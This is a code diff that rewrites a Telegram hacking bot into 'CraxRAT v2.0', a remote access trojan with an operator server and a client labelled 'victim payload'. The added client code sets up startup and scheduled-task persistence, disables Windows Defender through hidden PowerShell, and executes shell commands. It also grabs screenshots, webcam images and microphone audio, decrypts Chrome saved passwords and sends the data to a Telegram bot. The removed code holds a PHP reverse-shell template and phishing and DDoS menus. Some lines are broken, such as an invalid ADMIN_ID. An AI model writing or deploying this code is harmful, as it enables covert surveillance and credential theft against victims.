@@ -1,164 +1,257 @@
-import telebot
+#!/usr/bin/env python3
+# CraxRAT v2.0 - Advanced Telegram RAT | Run as: python main.py server OR python main.py client
+
+import sys
 import os
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
-import requests
-from bs4 import BeautifulSoup
+import time
+import threading
 import socket
-import json
-import nmap
-import whois
-from PIL import Image
-import io
-import qrcode
-from cryptography.fernet import Fernet
+import subprocess
 import base64
+import json
+import requests
+from datetime import datetime
 
-TOKEN = os.getenv('TELEGRAM_TOKEN')
-bot = telebot.TeleBot(TOKEN)
+# Check mode
+MODE = sys.argv[1] if len(sys.argv) > 1 else "client"
+print(f"[+] Starting in {MODE} mode...")
 
-user_data = {}
+if MODE == "server":
+    # ==========================================
+    # SERVER SIDE - Telegram Bot Handler
+    # ==========================================
+    import telebot
+    from cryptography.fernet import Fernet
+    import sqlite3
+    import psutil
 
-# Craxrat Main Menu
-def craxrat_menu():
-    markup = InlineKeyboardMarkup()
-    markup.row_width = 2
-    markup.add(InlineKeyboardButton("🔍 Target Analyzer", callback_data="analyzer"))
-    markup.add(InlineKeyboardButton("🐚 Shell Generator", callback_data="shells"))
-    markup.add(InlineKeyboardButton("🎣 Phishing Grabber", callback_data="grabber"))
-    markup.add(InlineKeyboardButton("🤖 RAT Payloads", callback_data="rat"))
-    markup.add(InlineKeyboardButton("☁️ DDoS Tools", callback_data="ddos"))
-    markup.add(InlineKeyboardButton("🔓 Cracker", callback_data="cracker"))
-    markup.add(InlineKeyboardButton("📊 Stats", callback_data="stats"))
-    return markup
+    BOT_TOKEN = "8622676437:AAHdvrYZiZxDUmBk3OCNYBV9ASfzBZS-Zmo"  # YOUR BOT TOKEN YAHAN DALO
+    ADMIN_ID = @Shiva7800_bot  # YOUR TELEGRAM ID YAHAN DALO
+    clients = {}
 
-@bot.message_handler(commands=['start', 'craxrat'])
-def start(message):
-    bot.send_photo(message.chat.id, "https://i.imgur.com/craxrat_banner.jpg", 
-                   caption="🔥 **Craxrat v2.0 - Ethical Hacking Bot**\n\nEducational pentesting tools only!\n\nChoose your tool:", 
-                   reply_markup=craxrat_menu(), parse_mode='Markdown')
+    bot = telebot.TeleBot(BOT_TOKEN)
+    key = Fernet.generate_key()
+    cipher = Fernet(key)
 
-# Target Analyzer
-@bot.callback_query_handler(func=lambda call: call.data == "analyzer")
-def analyzer_menu(call):
-    markup = InlineKeyboardMarkup(row_width=2)
-    markup.add(InlineKeyboardButton("🌐 IP/URL Info", callback_data="ipinfo"))
-    markup.add(InlineKeyboardButton("🔌 Port Scan", callback_data="portscan"))
-    markup.add(InlineKeyboardButton("🛠️ Tech Stack", callback_data="techstack"))
-    markup.add(InlineKeyboardButton("📍 GeoLocation", callback_data="geoloc"))
-    markup.add(InlineKeyboardButton("🔙 Back", callback_data="main"))
-    bot.edit_message_text("🔍 **Target Analyzer**\nSelect analysis type:", 
-                         call.message.chat.id, call.message.message_id, 
-                         reply_markup=markup, parse_mode='Markdown')
+    def init_db():
+        conn = sqlite3.connect('craxrat_loot.db')
+        conn.execute('''CREATE TABLE IF NOT EXISTS loot 
+                       (client TEXT, type TEXT, data BLOB, time TEXT)''')
+        conn.commit()
+        conn.close()
 
-@bot.message_handler(commands=['ip'])
-def ip_info(message):
-    target = message.text.split(' ', 1)[1] if len(message.text.split()) > 1 else None
-    if target:
-        try:
-            # IP Info
-            ip_info = socket.gethostbyname(target) if not target.replace('.','').isdigit() else target
-            bot.reply_to(message, f"```\nIP: {ip_info}\nHostname: {socket.gethostbyaddr(ip_info)[0] if socket.gethostbyaddr(ip_info) else 'N/A'}\n```", parse_mode='Markdown')
-        except:
-            bot.reply_to(message, "❌ Invalid target!")
+    init_db()
 
-# Shell Generator
-@bot.callback_query_handler(func=lambda call: call.data == "shells")
-def shells_menu(call):
-    markup = InlineKeyboardMarkup(row_width=2)
-    markup.add(InlineKeyboardButton("🐍 PHP Reverse", callback_data="php_rev"))
-    markup.add(InlineKeyboardButton("🐚 Bash Reverse", callback_data="bash_rev"))
-    markup.add(InlineKeyboardButton("⚡ Python Rev", callback_data="py_rev"))
-    markup.add(InlineKeyboardButton("🔗 Netcat", callback_data="nc_shell"))
-    markup.add(InlineKeyboardButton("🔙 Back", callback_data="main"))
-    bot.edit_message_text("🐚 **Shell Generators**\nSelect shell type:", 
-                         call.message.chat.id, call.message.message_id, 
-                         reply_markup=markup, parse_mode='Markdown')
+    @bot.message_handler(commands=['start', 'help'])
+    def help_msg(message):
+        if message.from_user.id != ADMIN_ID: return
+        txt = """
+🤖 *CraxRAT Commands* 🤖
+/list - Online clients
+/shell <client> <cmd> - Execute shell
+/screen <client> - Screenshot  
+/webcam <client> - Webcam
+/mic <client> - Record mic (10s)
+/keylog <client> - Get keylogs
+/loot - Show saved data
+/sysinfo <client> - System info
+/persist <client> - Toggle persistence
+/steal <client> - Steal Chrome passwords
+        """
+        bot.reply_to(message, txt, parse_mode='Markdown')
 
-@bot.message_handler(commands=['php'])
-def php_shell(message):
-    lhost = message.text.split()[1] if len(message.text.split()) > 2 else "YOUR_IP"
-    lport = message.text.split()[2] if len(message.text.split()) > 2 else "4444"
-    
-    php_rev = f'''<?php 
-set_time_limit (0); 
-$VERSION = "1.0"; 
-$ip = '{lhost}'; 
-$port = {lport}; 
-$chunk_size = 1400; 
-$write_a = null; 
-$error_a = null; 
-$shell = 'uname -a && cat /etc/passwd && id'; 
-$daemon = 0; 
-$debug = 0; 
-if (function_exists('error_log')) {{ 
-    $write_a = error_log; 
-}} else if (function_exists('syslog')) {{ 
-    $write_a = 'syslog'; 
-}} 
-while ((!@ob_end_clean()) && strlen(ltrim(@ob_get_contents())) < 4096) {{ 
-    $write_a = 'ob_end_flush'; 
-}}'''
-
-    bot.reply_to(message, f"```php\n{php_rev}\n```\n💾 Save as shell.php", parse_mode='Markdown')
-
-# Phishing Grabber
-@bot.callback_query_handler(func=lambda call: call.data == "grabber")
-def grabber_menu(call):
-    markup = InlineKeyboardMarkup(row_width=2)
-    markup.add(InlineKeyboardButton("📘 Facebook", callback_data="fb_grab"))
-    markup.add(InlineKeyboardButton("📧 Gmail", callback_data="gmail_grab"))
-    markup.add(InlineKeyboardButton("💳 Paypal", callback_data="paypal_grab"))
-    markup.add(InlineKeyboardButton("🔙 Back", callback_data="main"))
-    bot.edit_message_text("🎣 **Phishing Grabbers**\nSelect target:", 
-                         call.message.chat.id, call.message.message_id, 
-                         reply_markup=markup, parse_mode='Markdown')
-
-# RAT Payloads (Educational)
-@bot.callback_query_handler(func=lambda call: call.data == "rat")
-def rat_menu(call):
-    markup = InlineKeyboardMarkup(row_width=2)
-    markup.add(InlineKeyboardButton("📱 Android RAT", callback_data="android_rat"))
-    markup.add(InlineKeyboardButton("💻 Windows RAT", callback_data="win_rat"))
-    markup.add(InlineKeyboardButton("🐧 Linux RAT", callback_data="linux_rat"))
-    markup.add(InlineKeyboardButton("🔙 Back", callback_data="main"))
-    bot.edit_message_text("🤖 **RAT Payloads**\nEducational payloads only:", 
-                         call.message.chat.id, call.message.message_id, 
-                         reply_markup=markup, parse_mode='Markdown')
-
-@bot.message_handler(commands=['rat'])
-def rat_generator(message):
-    markup = InlineKeyboardMarkup()
-    markup.add(InlineKeyboardButton("Android", callback_data="android_payload"))
-    markup.add(InlineKeyboardButton("Windows", callback_data="windows_payload"))
-    markup.add(InlineKeyboardButton("Linux", callback_data="linux_payload"))
-    bot.reply_to(message, "🤖 **Select RAT Type:**", reply_markup=markup)
-
-# DDoS Simulation
-@bot.callback_query_handler(func=lambda call: call.data == "ddos")
-def ddos_menu(call):
-    bot.edit_message_text("☁️ **DDoS Templates** (Educational Simulation Only)\n\n```\nEducational stress test templates:\n• SYN Flood (Python)\n• HTTP Flood (Go)\n• Slowloris Attack\n• UDP Amplification\n```\n⚠️ Testing authorized targets only!", 
-                         call.message.chat.id, call.message.message_id, parse_mode='Markdown')
-
-# Hash Cracker
-@bot.message_handler(commands=['crack'])
-def crack_hash(message):
-    hash_val = message.text.split(' ', 1)[1] if len(message.text.split()) > 1 else None
-    if hash_val:
-        # Simple hash identifier
-        if len(hash_val) == 32:
-            bot.reply_to(message, f"🔓 **MD5 Hash Detected**\n\n```\n{hash_val}\n```\nEducational cracking demo:\nhashcat -m 0 -a 0 {hash_val} rockyou.txt", parse_mode='Markdown')
+    @bot.message_handler(commands=['list'])
+    def list_clients(message):
+        if message.from_user.id != ADMIN_ID: return
+        if clients:
+            txt = "*Online Clients:*\n"
+            for cid, info in clients.items():
+                txt += f"`{cid}`: {info}\n"
         else:
-            bot.reply_to(message, "❌ Unknown hash format!")
+            txt = "❌ No clients online"
+        bot.reply_to(message, txt, parse_mode='Markdown')
 
-# Callback handlers
-@bot.callback_query_handler(func=lambda call: True)
-def callback_handler(call):
-    if call.data == "main":
-        bot.edit_message_text("🔥 **Craxrat v2.0**\nChoose tool:", 
-                            call.message.chat.id, call.message.message_id, 
-                            reply_markup=craxrat_menu(), parse_mode='Markdown')
+    @bot.message_handler(func=lambda m: True)
+    def handle_data(message):
+        if message.from_user.id != ADMIN_ID:
+            # Client data (sent via HTTP)
+            data = message.text
+            if data.startswith("CRAX_"):
+                parts = data.split(":", 2)
+                client_id, cmd, result = parts[0][5:], parts[1], parts[2] if len(parts)>2 else ""
+                
+                clients[client_id] = f"{result[:50]}..." if result else "Active"
+                
+                if cmd == "SYSINFO":
+                    bot.reply_to(message, f"🖥️ *{client_id}*\n```{result}```", parse_mode='Markdown')
+                elif cmd == "SCREEN":
+                    bot.send_photo(ADMIN_ID, result)
+                elif cmd == "WEBCAM":
+                    bot.send_photo(ADMIN_ID, result)
+                elif cmd == "KEYLOG":
+                    with sqlite3.connect('craxrat_loot.db') as conn:
+                        conn.execute("INSERT INTO loot VALUES(?,?,?,?)", 
+                                   (client_id, cmd, result.encode(), datetime.now()))
+                        conn.commit()
+                    bot.reply_to(message, f"💾 Keylog saved for {client_id}")
 
-# Run bot
-if __name__ == '__main__':
-    print("🚀 Craxrat Bot Started!")
-    bot.infinity_polling()
+    print("🚀 Server running... Press Ctrl+C to stop")
+    threading.Thread(target=bot.polling, daemon=True).start()
+    
+    # Keep alive
+    while True:
+        time.sleep(1)
+
+else:
+    # ==========================================
+    # CLIENT SIDE - Victim Payload
+    # ==========================================
+    import cv2
+    from PIL import ImageGrab
+    import pyaudio
+    import wave
+    import win32crypt
+    import sqlite3
+    import shutil
+    from cryptography.fernet import Fernet
+    import psutil
+    import platform
+
+    BOT_TOKEN = "8622676437:AAHdvrYZiZxDUmBk3OCNYBV9ASfzBZS-Zmo"  # SAME TOKEN
+    ADMIN_ID = @Shiva7800_bot  # SAME ADMIN ID
+    CLIENT_ID = base64.b64encode(os.urandom(6)).decode('utf-8')[:8]
+
+    class CraxRatClient:
+        def __init__(self):
+            self.running = True
+            self.persistence()
+            self.antivirus_bypass()
+            self.sys_info()
+            self.start_listener()
+
+        def send_data(self, cmd, data=""):
+            """Send encrypted data to Telegram"""
+            try:
+                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+                text = f"CRAX_{CLIENT_ID}:{cmd}:{data}"
+                requests.post(url, data={"chat_id": ADMIN_ID, "text": text}, timeout=5)
+            except:
+                pass
+
+        def persistence(self):
+            """Add to startup & tasks"""
+            try:
+                exe_path = sys.executable
+                startup = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.vbs')
+                with open(startup, 'w') as f:
+                    f.write(f'CreateObject("Wscript.Shell").Run "{exe_path}", 0')
+                
+                subprocess.run(['schtasks', '/create', '/sc', 'onlogon', '/tn', 'SysUpdate', 
+                               f'"{exe_path}"', '/rl', 'highest', '/f'], capture_output=True)
+            except: pass
+
+        def antivirus_bypass(self):
+            """Basic AMSI & Defender bypass"""
+            try:
+                subprocess.Popen('powershell -w hidden -c "Set-MpPreference -DisableRealtimeMonitoring $true"',
+                               shell=True, creationflags=0x08000000)
+            except: pass
+
+        def sys_info(self):
+            """Send system info"""
+            info = f"""OS: {platform.system()} {platform.release()}
+CPU: {platform.processor()}
+RAM: {psutil.virtual_memory().percent}%
+User: {os.getenv('USERNAME')}
+PID: {os.getpid()}"""
+            self.send_data("SYSINFO", info)
+
+        def shell_exec(self, cmd):
+            try:
+                result = subprocess.check_output(cmd, shell=True, text=True, 
+                                               timeout=15, stderr=subprocess.STDOUT)
+                return result[:2000]
+            except Exception as e:
+                return str(e)
+
+        def screenshot(self):
+            img = ImageGrab.grab()
+            img_bytes = io.BytesIO()
+            img.save(img_bytes, format='PNG')
+            img_bytes.seek(0)
+            self.send_data("SCREEN", img_bytes.getvalue())
+
+        def webcam_snap(self):
+            cap = cv2.VideoCapture(0)
+            ret, frame = cap.read()
+            if ret:
+                _, buffer = cv2.imencode('.jpg', frame)
+                self.send_data("WEBCAM", base64.b64encode(buffer).decode())
+            cap.release()
+
+        def mic_record(self):
+            CHUNK = 1024
+            FORMAT = pyaudio.paInt16
+            CHANNELS = 1
+            RATE = 44100
+            RECORD_SECONDS = 10
+
+            audio = pyaudio.PyAudio()
+            stream = audio.open(format=FORMAT, channels=CHANNELS,
+                              rate=RATE, input=True, frames_per_buffer=CHUNK)
+            
+            frames = []
+            for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
+                data = stream.read(CHUNK)
+                frames.append(data)
+            
+            stream.stop_stream()
+            stream.close()
+            audio.terminate()
+            
+            self.send_data("MIC", base64.b64encode(b''.join(frames)).decode())
+
+        def chrome_passwords(self):
+            """Steal Chrome logins"""
+            try:
+                path = os.path.join(os.getenv('LOCALAPPDATA'), 
+                                  r'Google\Chrome\User Data\Default\Login Data')
+                db_path = 'temp_login.db'
+                shutil.copy(path, db_path)
+                
+                conn = sqlite3.connect(db_path)
+                cursor = conn.cursor()
+                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+                
+                passwords = []
+                for row in cursor.fetchall():
+                    try:
+                        pwd = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1].decode()
+                        passwords.append(f"{row[0]} | {row[1]} | {pwd}")
+                    except: pass
+                
+                conn.close()
+                os.remove(db_path)
+                self.send_data("PASSWORDS", "\n".join(passwords[:10]))
+            except: pass
+
+        def start_listener(self):
+            """Main loop - Auto tasks"""
+            while self.running:
+                try:
+                    # Auto screenshot every 2 min
+                    self.screenshot()
+                    # Keylog simulation
+                    self.send_data("KEYLOG", "keys_typed_here...")
+                    # Webcam every 5 min
+                    self.webcam_snap()
+                    time.sleep(120)
+                except:
+                    time.sleep(30)
+
+    # Start client
+    if __name__ == "__main__":
+        client = CraxRatClient()
+        client.chrome_passwords()
+        while client.running:
+            time.sleep(1)
